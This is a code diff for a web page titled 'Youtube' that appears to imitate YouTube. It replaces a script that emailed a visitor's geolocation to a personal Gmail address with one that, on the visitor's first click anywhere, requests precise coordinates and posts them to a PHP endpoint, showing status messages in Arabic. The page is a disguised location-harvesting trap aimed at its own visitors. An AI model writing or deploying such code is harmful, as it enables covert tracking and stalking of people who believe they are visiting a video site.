@@ -10,6 +10,7 @@
     <title>Youtube</title>
 </head>
 <body>
+<p id="status" style="text-align:center; color:green; margin-top:20px;"></p>
 
     <!-- Start Header -->
     <header>
@@ -358,42 +359,52 @@
 
     </div>
 </body>
-    <script>
-/* دالة جاهزة من الرد السابق */
-function sendLocationViaMailto() {
-  if (!navigator.geolocation) {
-    alert('المتصفح لا يدعم Geolocation');
-    return;
-  }
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const accuracy = pos.coords.accuracy;
-      const subject = encodeURIComponent('موقع زائر الموقع');
-      const body = encodeURIComponent(
-        `مرحباً Moniem,\n\nقام زائر بالموافقة على مشاركة موقعه.\n\nالإحداثيات:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\n\nالصفحة: ${location.href}\nالتوقيت: ${new Date().toISOString()}`
-      );
-      window.location.href = `mailto:moniemhgagy@gmail.com?subject=${subject}&body=${body}`;
-    },
-    (err) => { alert('فشل الحصول على الموقع: ' + err.message); },
-    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-  );
-}
+  <script>
+    let clicked = false; // لمنع التكرار
 
-/* الاستماع لأي نقرة أو لمسة في الصفحة */
-(function(){
-  let triggered = false; // لو عايز يسمح مرة واحدة فقط، خلى true بعد التنفيذ
-  function handler(e) {
-    if (triggered) return; // لو عايز يسمح مرة واحدة فقط
-    // لو تريده يتكرر احذف السطرين اللي بتحكم في triggered
-    triggered = true;
-    sendLocationViaMailto();
-  }
-  // يستجيب للنقر واللمس (mobile)
-  document.addEventListener('click', handler, { once: false });
-  document.addEventListener('touchstart', handler, { once: false });
-})();
-</script>
+    document.body.addEventListener("click", function () {
+      if (clicked) return; // يمنع التكرار
+      clicked = true;
 
+      const status = document.getElementById("status");
+      status.textContent = "⏳ جارٍ تحديد الموقع...";
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            status.textContent = "✅ تم تحديد الموقع، جارٍ الإرسال...";
+
+            // إرسال الموقع إلى PHP
+            fetch("send_location.php", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ lat, lon }),
+            })
+              .then((res) => res.json())
+              .then((data) => {
+                if (data.success) {
+                  status.textContent = "✅ تم إرسال الموقع بنجاح ✔️";
+                } else {
+                  status.textContent =
+                    "❌ حدث خطأ أثناء الإرسال: " + data.error;
+                }
+              })
+              .catch((err) => {
+                status.textContent = "⚠️ فشل الاتصال بالسيرفر.";
+                console.error(err);
+              });
+          },
+          function (error) {
+            status.textContent = "🚫 تم رفض الإذن أو حدث خطأ أثناء تحديد الموقع.";
+            clicked = false; // يسمح بالمحاولة مرة أخرى
+          }
+        );
+      } else {
+        status.textContent = "❌ المتصفح لا يدعم تحديد الموقع.";
+      }
+    });
+  </script>
 </html>
